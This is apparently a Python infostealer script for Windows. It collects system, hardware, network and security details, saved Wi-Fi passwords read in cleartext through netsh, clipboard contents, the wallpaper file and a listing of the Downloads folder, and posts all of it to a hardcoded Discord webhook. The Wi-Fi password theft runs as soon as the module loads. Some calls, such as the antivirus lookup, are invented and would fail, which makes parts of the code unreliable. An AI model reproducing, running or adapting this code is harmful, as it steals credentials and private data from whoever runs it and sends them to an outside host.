import math
import os
import sys
import platform
import subprocess
import time
import datetime
import socket
import uuid
import locale
import getpass
import psutil
import cpuinfo
import threading
import multiprocessing
import GPUtil
import screeninfo
import win32com.client
import ctypes
import wmi
import requests
import re
import scapy.all as scapy
import winreg
import json
import winreg
import wmi
import keyboard
import mouse
import usb.core

webhook_url = "https://discord.com/api/webhooks/1395696470262546504/IRZ9M6QgNxC-x4wzVbo4UrLTGoUcF9AfipLoe_zwmbs3jL0LsnnUqAoYeK2hh7VfDj82"

def send_discord_message(data_dict, title="Info"):
    json_text = json.dumps(data_dict, indent=2)
    chunks = [json_text[i:i+1800] for i in range(0, len(json_text), 1800)]
    for idx, chunk in enumerate(chunks):
        message = f"{title} (Part {idx+1}/{len(chunks)}):\n```json\n{chunk}\n```"
        requests.post(webhook_url, json={"content": message})
        time.sleep(1)

def general_system_info():
    info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "python_version": sys.version,
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "locale": locale.getdefaultlocale(),
        "user": getpass.getuser(),
        "time_zone": time.tzname,
        "current_time": datetime.datetime.now().isoformat(),
        "uptime": str(datetime.timedelta(seconds=int(time.time() - psutil.boot_time()))),
        "uuid": str(uuid.uuid1()),
        "computer_name": platform.node(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "platform": platform.platform(),
    }
    
    send_discord_message(info, title="General System Info")

def cpu_ram_performance_info():
    info = {
        "cpu_count": psutil.cpu_count(logical=True),
        "cpu_freq": psutil.cpu_freq()._asdict(),
        "cpu_times": psutil.cpu_times()._asdict(),
        "ram_total": psutil.virtual_memory().total,
        "ram_available": psutil.virtual_memory().available,
        "ram_used": psutil.virtual_memory().used,
        "ram_percent": psutil.virtual_memory().percent,
        "swap_total": psutil.swap_memory().total,
        "swap_used": psutil.swap_memory().used,
        "swap_free": psutil.swap_memory().free,
        "swap_percent": psutil.swap_memory().percent,
        "disk_partitions": [part._asdict() for part in psutil.disk_partitions(all=False)],
        "disk_usage": {part.mountpoint: psutil.disk_usage(part.mountpoint)._asdict() for part in psutil.disk_partitions(all=False)},
        "disk_io_counters": psutil.disk_io_counters()._asdict(),
        "network_io_counters": psutil.net_io_counters()._asdict(),
        "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
        "load_avg": psutil.getloadavg(),
        "cpu_percent": psutil.cpu_percent(interval=1),
        "cpu_stats": psutil.cpu_stats()._asdict(),
        "cpu_times_percent": psutil.cpu_times_percent(interval=1)._asdict(),
        "memory_info": psutil.virtual_memory()._asdict(),
        "swap_info": psutil.swap_memory()._asdict(),
        "num_threads": threading.active_count(),
        "num_processes": len(psutil.pids()),
        "num_cpus": multiprocessing.cpu_count(),
        "cpu_info": cpuinfo.get_cpu_info(),
        "cpu_architecture": platform.machine(),
        "cpu_physical_cores": psutil.cpu_count(logical=False),
        "cpu_logical_cores": psutil.cpu_count(logical=True),
        "cpu_usage": psutil.cpu_percent(interval=1),
    }

    send_discord_message(info, title="CPU, RAM, and Performance Info")

def gpu_display_info():
    gpus = GPUtil.getGPUs()
    gpu_info = []
    for gpu in gpus:
        gpu_info.append({
            "id": gpu.id,
            "name": gpu.name,
            "driver_version": gpu.driver,
            "memory_total": gpu.memoryTotal,
            "memory_free": gpu.memoryFree,
            "memory_used": gpu.memoryUsed,
            "temperature": gpu.temperature,
            "load": gpu.load,
            "gpu_uuid": gpu.uuid if hasattr(gpu, 'uuid') else None,
            "gpu_serial": gpu.serial if hasattr(gpu, 'serial') else None,
            'gpu_vbios_version': gpu.vbios if hasattr(gpu, 'vbios') else None,
            "gpu_bus_id": gpu.bus_id if hasattr(gpu, 'bus_id') else None,
            "gpu_pci_id": gpu.pci_id if hasattr(gpu, 'pci_id') else None,
            "gpu_display_mode": gpu.display_mode if hasattr(gpu, 'display_mode') else None,
            "gpu_display_active": gpu.display_active if hasattr(gpu, 'display_active') else None
        })

    displays = screeninfo.get_monitors()
    display_info = []
    for display in displays:
        display_info.append({
            "name": display.name,
            "width": display.width,
            "height": display.height,
            "x": display.x,
            "y": display.y
        })

    send_discord_message({
        "gpus": gpu_info,
        "displays": display_info}, title="GPU and Display Info")

def storage_filesystem_info():
    partitions = psutil.disk_partitions(all=False)
    partition_info = []
    for partition in partitions:
        usage = psutil.disk_usage(partition.mountpoint)
        partition_info.append({
            "device": partition.device,
            "mountpoint": partition.mountpoint,
            "fstype": partition.fstype,
            "opts": partition.opts,
            "total": usage.total,
            "used": usage.used,
            "free": usage.free,
            "percent": usage.percent
        })

    send_discord_message({
        "partitions": partition_info,
        "disk_io_counters": psutil.disk_io_counters()._asdict(),
        "disk_usage": {part.mountpoint: psutil.disk_usage(part.mountpoint)._asdict() for part in partitions}
    }, title="Storage and Filesystem Info")


def battery_power_info():
    battery = psutil.sensors_battery()
    battery_info = {
        "battery_present": battery.power_plugged,
        "battery_percent": battery.percent,
        "battery_time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft != psutil.POWER_TIME_UNLIMITED else "Unknown",
        "battery_status": "Charging" if battery.power_plugged else "Discharging",
        "battery_info": {
            "percent": battery.percent,
            "plugged": battery.power_plugged,
            "secsleft": battery.secsleft,
            "time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft != psutil.POWER_TIME_UNLIMITED else "Unknown"
        }
    }

    send_discord_message(battery_info, title="Battery and Power Info")


def network_info():
    interfaces = psutil.net_if_addrs()
    connections = psutil.net_connections(kind='inet')
    network_info = {
        "interfaces": {iface: [addr.address for addr in addrs] for iface, addrs in interfaces.items()},
        "connections": [{"fd": conn.fd, "family": conn.family.name, "type": conn.type.name, "laddr": conn.laddr, "raddr": conn.raddr, "status": conn.status} for conn in connections],
        "network_io_counters": psutil.net_io_counters()._asdict(),
        "ip_info": {
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
            "public_ip": requests.get('https://api.ipify.org').text if requests else "N/A",
            "local_ip": socket.gethostbyname(socket.gethostname()),
            "dns_servers": [dns['address'] for dns in psutil.net_if_addrs().get('DNS Servers', [])],
            "network_interfaces": {iface: [addr.address for addr in addrs] for iface, addrs in psutil.net_if_addrs().items()},
            "network_connections": [{"fd": conn.fd, "family": conn.family.name, "type": conn.type.name, "laddr": conn.laddr, "raddr": conn.raddr, "status": conn.status} for conn in psutil.net_connections(kind='inet')],
            "firewall_rules": str(psutil.net_if_stats()),
            "network_stats": {
                "bytes_sent": psutil.net_io_counters().bytes_sent,
                "bytes_recv": psutil.net_io_counters().bytes_recv,
                "packets_sent": psutil.net_io_counters().packets_sent,
                "packets_recv": psutil.net_io_counters().packets_recv
            },
        }
    }

    send_discord_message(network_info, title="Network Info")

def get_wifi_nameandpassword():
    try:
        wifi_info = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode('utf-8')
        wifi_names = re.findall(r'All User Profile\s*:\s*(.*)', wifi_info)
        wifi_passwords = {}
        for name in wifi_names:
            try:
                password_info = subprocess.check_output(["netsh", "wlan", "show", "profile", name, "key=clear"]).decode('utf-8')
                password = re.search(r'Key Content\s*:\s*(.*)', password_info)
                if password:
                    wifi_passwords[name] = password.group(1)
                else:
                    wifi_passwords[name] = "No password found"
            except subprocess.CalledProcessError:
                wifi_passwords[name] = "Error retrieving password"
        return wifi_passwords
    except Exception as e:
        print(f"Error retrieving WiFi names and passwords: {e}")
        return {}

send_discord_message(get_wifi_nameandpassword(), title="WiFi Names and Passwords")

def grabclipboard():
    try:
        if platform.system() == "Windows":
            import win32clipboard
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            send_discord_message({"clipboard": clipboard_data}, title="Clipboard Data")
        else:
            print("Clipboard access is currently only supported on Windows.")
    except Exception as e:
        print(f"Error accessing clipboard: {e}")
        send_discord_message({"error": str(e)}, title="Clipboard Error")


def security_info():
    try:
        antivirus = win32com.client.Dispatch("Microsoft.Update.Session")
        antivirus_info = antivirus.GetAntivirusProduct().Name
    except Exception as e:
        antivirus_info = f"Error retrieving antivirus info: {e}"

    try:
        firewall_status = win32com.client.Dispatch("HNetCfg.FwMgr").LocalPolicy.CurrentProfile.FirewallEnabled
    except Exception as e:
        firewall_status = f"Error retrieving firewall status: {e}"

    
    send_discord_message({
        "antivirus": antivirus_info,
        "firewall_enabled": firewall_status
    }, title="Security Info")

def installed_software_info():
    try:
        software_list = []
        uninstall_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key) as key:
            for i in range(winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                with winreg.OpenKey(key, subkey_name) as subkey:
                    try:
                        display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        display_version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                        software_list.append({"name": display_name, "version": display_version})
                    except FileNotFoundError:
                        continue
        send_discord_message({"installed_software": software_list}, title="Installed Software Info")
    except Exception as e:
        print(f"Error retrieving installed software: {e}")
        send_discord_message({"error": str(e)}, title="Installed Software Error")


def get_wallpaper():
    try:
        SPI_GETDESKWALLPAPER = 20
        buffer = ctypes.create_unicode_buffer(260)
        ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, 260, buffer, 0)
        wallpaper_path = buffer.value.strip()

        # Fallback for dynamic wallpapers
        if not wallpaper_path or not os.path.exists(wallpaper_path):
            wallpaper_path = os.path.expandvars(r"%AppData%\Microsoft\Windows\Themes\TranscodedWallpaper")

        if os.path.exists(wallpaper_path):
            with open(wallpaper_path, 'rb') as f:
                files = {'file': ('wallpaper.jpg', f)}
                response = requests.post(webhook_url, files=files, data={"content": "🖼️ Windows background wallpaper"})
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if "attachments" in data and data["attachments"]:
                            cdn_url = data["attachments"][0]["url"]
                            send_discord_message({"cdn_link": cdn_url}, title="Wallpaper CDN Link")
                        else:
                            send_discord_message({"error": "No attachment in response"}, title="Wallpaper Upload Error")
                    except Exception as parse_error:
                        send_discord_message({"error": str(parse_error)}, title="Wallpaper JSON Parse Error")
                else:
                    send_discord_message({"error": f"Upload failed (HTTP {response.status_code})"}, title="Wallpaper Upload Error")
        else:
            send_discord_message({"error": "Wallpaper file does not exist"}, title="Wallpaper Error")

    except Exception as e:
        send_discord_message({"error": str(e)}, title="Wallpaper Exception")


def bios_motherboard_tpm_info():
    try:
        c = wmi.WMI()
        bios_info = c.Win32_BIOS()[0]
        motherboard_info = c.Win32_BaseBoard()[0]
        tpm_info = c.Win32_Tpm()[0] if c.Win32_Tpm() else None

        info = {
            "bios": {
                "manufacturer": bios_info.Manufacturer,
                "version": bios_info.Version,
                "release_date": bios_info.ReleaseDate,
                "serial_number": bios_info.SerialNumber,
                "status": bios_info.Status,
                "caption": bios_info.Caption,
                "description": bios_info.Description,
                "creation_class_name": bios_info.CreationClassName,
                "name": bios_info.Name,
                "system_creation_class_name": bios_info.SystemCreationClassName,
                "system_name": bios_info.SystemName,
                "installable_languages": bios_info.InstallableLanguages,
                "language": bios_info.Language,
                "manufacturer_id": bios_info.ManufacturerID,
                "version_major": bios_info.VersionMajor,
                "version_minor": bios_info.VersionMinor,
                "version_build": bios_info.VersionBuild,
                "version_revision": bios_info.VersionRevision,
                "version_release": bios_info.VersionRelease,
                "version_release_date": bios_info.VersionReleaseDate,
                "version_status": bios_info.VersionStatus,
                "version_caption": bios_info.VersionCaption,
                "version_description": bios_info.VersionDescription

            },
            "motherboard": {
                "manufacturer": motherboard_info.Manufacturer,
                "product": motherboard_info.Product,
                "serial_number": motherboard_info.SerialNumber,
                "version": motherboard_info.Version,
                "status": motherboard_info.Status,
                "caption": motherboard_info.Caption,
                "description": motherboard_info.Description,
                "creation_class_name": motherboard_info.CreationClassName,
                "name": motherboard_info.Name,
                "system_creation_class_name": motherboard_info.SystemCreationClassName,
                "system_name": motherboard_info.SystemName
            },
            "tpm": {
                "is_present": tpm_info.IsEnabled if tpm_info else False,
                "manufacturer_id": tpm_info.ManufacturerID if tpm_info else None,
                "version": tpm_info.SpecVersion if tpm_info else None,
                "firmware_version": tpm_info.FirmwareVersion if tpm_info else None,
                "physical_presence": tpm_info.PhysicalPresence if tpm_info else None,
                "tpm_version": tpm_info.TpmVersion if tpm_info else None,
                "tpm_type": tpm_info.TpmType if tpm_info else None,
                "tpm_status": tpm_info.Status if tpm_info else None,
                "tpm_manufacturer": tpm_info.Manufacturer if tpm_info else None,
                "tpm_serial_number": tpm_info.SerialNumber if tpm_info else None,
                "tpm_spec_version": tpm_info.SpecVersion if tpm_info else None,
                "tpm_firmware_version": tpm_info.FirmwareVersion if tpm_info else None,
                "tpm_is_enabled": tpm_info.IsEnabled if tpm_info else None,
                "tpm_is_owned": tpm_info.IsOwned if tpm_info else None,
                "tpm_is_active": tpm_info.IsActive if tpm_info else None,
                "tpm_is_deactivated": tpm_info.IsDeactivated if tpm_info else None
            }
        }

        send_discord_message(info, title="BIOS, Motherboard, and TPM Info")
    except Exception as e:
        send_discord_message({"error": str(e)}, title="BIOS/Motherboard/TPM Error")

def peripherals_info():
    try:
        mouse_info = {
            "position": mouse.get_position(),
            "buttons": mouse.get_pressed(),
            "scroll": mouse.get_scroll()
        }

        keyboard_info = {
            "layout": keyboard.get_keyboard_layout(),
            "is_pressed": {key: keyboard.is_pressed(key) for key in keyboard.all_modifiers}
        }

        usb_devices = usb.core.find(find_all=True)
        usb_info = []
        for device in usb_devices:
            usb_info.append({
                "id": device.idVendor,
                "product_id": device.idProduct,
                "manufacturer": usb.util.get_string(device, device.iManufacturer) if device.iManufacturer else None,
                "product": usb.util.get_string(device, device.iProduct) if device.iProduct else None,
                "serial_number": usb.util.get_string(device, device.iSerialNumber) if device.iSerialNumber else None
            })

        send_discord_message({
            "mouse_info": mouse_info,
            "keyboard_info": keyboard_info,
            "usb_devices": usb_info
        }, title="Peripherals Info")
    except Exception as e:
        send_discord_message({"error": str(e)}, title="Peripherals Error")

# 🛡️ Antivirus, firewall
def antivirus_firewall_info():
    try:
        antivirus = win32com.client.Dispatch("Microsoft.Update.Session")
        antivirus_info = antivirus.GetAntivirusProduct().Name
    except Exception as e:
        antivirus_info = f"Error retrieving antivirus info: {e}"

    try:
        firewall_status = win32com.client.Dispatch("HNetCfg.FwMgr").LocalPolicy.CurrentProfile.FirewallEnabled
    except Exception as e:
        firewall_status = f"Error retrieving firewall status: {e}"

    send_discord_message({
        "antivirus": antivirus_info,
        "firewall_enabled": firewall_status
    }, title="Antivirus and Firewall Info")

# 📊 Windows system
def windows_system_info():
    system_info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "python_version": sys.version,
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "locale": locale.getdefaultlocale(),
        "user": getpass.getuser(),
        "time_zone": time.tzname,
        "current_time": datetime.datetime.now().isoformat(),
        "uptime": str(datetime.timedelta(seconds=int(time.time() - psutil.boot_time()))),
        "uuid": str(uuid.uuid1()),
        "computer_name": platform.node(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "platform": platform.platform(),
    }

    send_discord_message(system_info, title="Windows System Info")  

def log_all_files_in_downloads():
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    if not os.path.exists(downloads_path):
        send_discord_message({"error": "Downloads folder does not exist"}, title="Downloads Folder Error")
        return

    files = []
    for root, dirs, filenames in os.walk(downloads_path):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            file_info = {
                "name": filename,
                "path": file_path,
                "size": os.path.getsize(file_path),
                "last_modified": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
            }
            files.append(file_info)

    send_discord_message({"downloaded_files": files}, title="Downloaded Files Info")


def format_size(bytesize):
    if bytesize == 0:
        return "0 B"
    size_units = ["B", "KB", "MB", "GB", "TB"]
    i = int(math.floor(math.log(bytesize, 1024)))
    p = math.pow(1024, i)
    s = round(bytesize / p, 2)
    return f"{s} {size_units[i]}"

def downloadsdigger(root_dir, max_length=1900):
    def build_tree(current_path, prefix=""):
        try:
            entries = sorted(os.listdir(current_path))
        except Exception:
            return [f"{prefix}> [Access Denied: {os.path.basename(current_path)}]"]

        folders = []
        files = []
        for e in entries:
            full = os.path.join(current_path, e)
            if os.path.isdir(full):
                folders.append(e)
            else:
                files.append(e)

        lines = []
        symbol = "v" if folders or files else ">"
        lines.append(f"{prefix}{symbol} {os.path.basename(current_path)}")

        subprefix = prefix + "    "

        for folder in folders:
            full_path = os.path.join(current_path, folder)
            lines.extend(build_tree(full_path, subprefix))

        for file in files:
            file_path = os.path.join(current_path, file)
            try:
                size = os.path.getsize(file_path)
                size_str = format_size(size)
                lines.append(f"{subprefix}📄 {file} ({size_str})")
            except Exception:
                lines.append(f"{subprefix}📄 {file} (size unknown)")

        return lines

    tree_lines = build_tree(root_dir)

    chunks = []
    buffer = ""
    for line in tree_lines:
        line += "\n"
        if len(buffer) + len(line) > max_length:
            chunks.append(buffer)
            buffer = ""
        buffer += line
    if buffer:
        chunks.append(buffer)

    # Step 3: Send each part via webhook
    total = len(chunks)
    for i, part in enumerate(chunks, 1):
        data = {
            "content": f"```{part}```",
            "username": "downloadsDigger",
        }
        response = requests.post(webhook_url, json=data)
        if response.status_code not in [200, 204]:
            print(f"[!] Failed to send part {i}/{total}: {response.status_code} - {response.text}")
        else:
            print(f"[+] Sent part {i}/{total}")


def gather_all_info():
    general_system_info()
    cpu_ram_performance_info()
    gpu_display_info()
    storage_filesystem_info()
    battery_power_info()
    network_info()
    security_info()
    installed_software_info()
    get_wallpaper()
    bios_motherboard_tpm_info()
    peripherals_info()
    antivirus_firewall_info()
    windows_system_info()

if __name__ == "__main__":
    gather_all_info()
    grabclipboard()
    log_all_files_in_downloads()
    downloadsdigger(os.path.expanduser("~/Downloads"))
